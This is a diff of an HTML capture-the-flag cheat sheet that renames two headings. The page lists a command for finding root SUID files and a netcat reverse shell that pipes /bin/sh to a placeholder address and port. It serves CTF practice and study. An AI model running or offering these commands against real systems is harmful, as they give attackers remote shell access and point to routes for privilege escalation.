@@ -151,12 +151,12 @@
 
 <h1 id="cheatsheet-ctf">Cheatsheet - CTF</h1>
 
-<h2 id="fin-suid">Fin SUID</h2>
+<h2 id="find-suid-files">Find SUID files</h2>
 
 <pre><code>find / -user root -perm -4000 -exec ls -ldb {} \;
 </code></pre>
 
-<h2 id="netcat-without-e">Netcat without -e</h2>
+<h2 id="reverse-shell-without-nc-e-bin-sh">Reverse shell without &ldquo;nc -e /bin/sh&rdquo;</h2>
 
 <pre><code>mknod /tmp/bp p 
 /bin/sh 0&lt;/tmp/bp | nc addr port 1&gt;/tmp/bp
